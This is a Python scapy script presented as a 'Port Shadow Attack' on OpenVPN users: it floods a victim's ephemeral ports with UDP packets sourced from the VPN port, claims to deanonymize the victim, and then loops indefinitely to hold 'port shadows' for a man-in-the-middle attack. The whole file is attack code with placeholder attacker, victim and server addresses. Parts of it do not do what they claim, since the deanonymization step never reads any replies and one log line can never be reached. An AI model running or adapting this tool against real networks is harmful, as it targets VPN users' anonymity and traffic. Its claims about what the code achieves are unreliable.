import os
import time
import random
from scapy.all import *
from threading import Thread
from queue import Queue

# Configuration
vpn_server_ip = "10.10.10.1"  # Replace with the target VPN server's IP
attacker_ip = "192.168.1.100"  # Replace with the attacker's IP address
victim_ip = "192.168.1.101"  # Replace with the victim's IP address
vpn_port = 1194  # Common OpenVPN port
scan_interval_range = (0.05, 0.2)  # Range for randomized scan intervals
maintain_interval = 30  # Interval between maintaining port shadows
retry_attempts = 3  # Number of retry attempts if a packet is dropped
concurrent_threads = 10  # Number of concurrent threads for scanning

# Function to create a port shadow
def create_port_shadow(target_ip, target_port):
    packet = IP(src=attacker_ip, dst=target_ip) / UDP(sport=vpn_port, dport=target_port)
    send(packet, verbose=0)

# Function to deanonymize the victim
def deanonymize_victim():
    print("[*] Starting deanonymization...")
    ports = list(range(49152, 65535))  # IANA ephemeral port range
    random.shuffle(ports)
    queue = Queue()

    def worker():
        while not queue.empty():
            port = queue.get()
            create_port_shadow(victim_ip, port)
            time.sleep(random.uniform(*scan_interval_range))
            queue.task_done()

    for port in ports:
        queue.put(port)

    threads = []
    for _ in range(concurrent_threads):
        thread = Thread(target=worker)
        thread.start()
        threads.append(thread)

    queue.join()
    for thread in threads:
        thread.join()

    print("[*] Deanonymization attempt complete.")

# Function to perform c2mitm attack
def c2mitm_attack():
    print("[*] Starting c2mitm attack...")
    while True:
        ports = list(range(49152, 65535))  # IANA ephemeral port range
        random.shuffle(ports)
        queue = Queue()

        def worker():
            while not queue.empty():
                port = queue.get()
                create_port_shadow(victim_ip, port)
                time.sleep(random.uniform(*scan_interval_range))
                queue.task_done()

        for port in ports:
            queue.put(port)

        threads = []
        for _ in range(concurrent_threads):
            thread = Thread(target=worker)
            thread.start()
            threads.append(thread)

        queue.join()
        for thread in threads:
            thread.join()

        print("[*] Port shadows maintained. Sleeping for {} seconds.".format(maintain_interval))
        time.sleep(maintain_interval)  # Sleep before repeating to maintain shadows

# Function to log attack activities
def log_attack(activity):
    with open("attack_log.txt", "a") as log_file:
        log_file.write(f"{time.ctime()}: {activity}\n")

if __name__ == "__main__":
    log_attack("Starting Port Shadow Attack")

    print("[*] Deanonymizing victim...")
    log_attack("Deanonymizing victim...")
    deanonymize_victim()
    log_attack("Deanonymization complete")

    print("[*] Maintaining Port Shadows for c2mitm Attack...")
    log_attack("Maintaining Port Shadows for c2mitm Attack...")
    c2mitm_attack()
    log_attack("c2mitm Attack initiated")
